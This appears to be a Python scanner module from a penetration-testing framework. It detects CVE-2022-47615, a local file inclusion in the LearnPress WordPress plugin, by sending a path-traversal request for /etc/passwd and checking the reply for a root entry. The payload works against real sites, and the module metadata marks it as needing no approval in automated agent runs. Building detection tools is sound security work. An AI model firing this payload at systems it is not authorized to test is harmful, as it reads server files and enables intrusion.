#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Local File Inclusion vulnerability in LearnPress – WordPress LMS Plugin <= 4."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'LearnPress Plugin < 4.2.0 - Local File Inclusion Detection',
        'description': 'Local File Inclusion vulnerability in LearnPress – WordPress LMS Plugin <= 4.1.7.3.2 versions.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'wp-plugin', 'wp', 'wordpress', 'learnpress', 'lfi', 'thimpress', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/RandomRobbieBF/CVE-2022-47615/tree/main',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-47615',
            'https://patchstack.com/database/vulnerability/learnpress/wordpress-learnpress-plugin-4-1-7-3-2-local-file-inclusion?_s_id=cve',
            'https://github.com/RandomRobbieBF/CVE-2022-47615',
        ],
        'cve': 'CVE-2022-47615',
    }

    def run(self):
        path = '/wp-json/lp/v1/courses/archive-course?template_path=..%2F..%2F..%2Fetc%2Fpasswd&return_type=html'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('"status":', '"pagination":',)
        header_any = ('application/json',)
        body_regexes = ('root:.*:0:0:',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)) and (any(re.search(rx, body) for rx in body_regexes)):
            self.set_info(severity='critical', reason='LearnPress Plugin < 4.2.0 - Local File Inclusion detected', path=path)
            return True
        return False

